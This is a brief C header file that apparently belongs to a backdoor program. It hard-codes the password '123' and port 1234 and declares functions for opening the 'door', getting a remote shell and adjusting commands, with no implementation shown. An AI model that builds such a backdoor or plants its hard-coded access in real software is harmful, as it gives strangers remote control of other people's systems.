#ifndef _DOOR_H_
#define _DOOR_H_
#define G_PASSWORD "123"
#define G_PORT 1234

int open_door(SOCKET sock);
int get_shell(SOCKET target);
char * adjust_cmd(char *in);

#endif
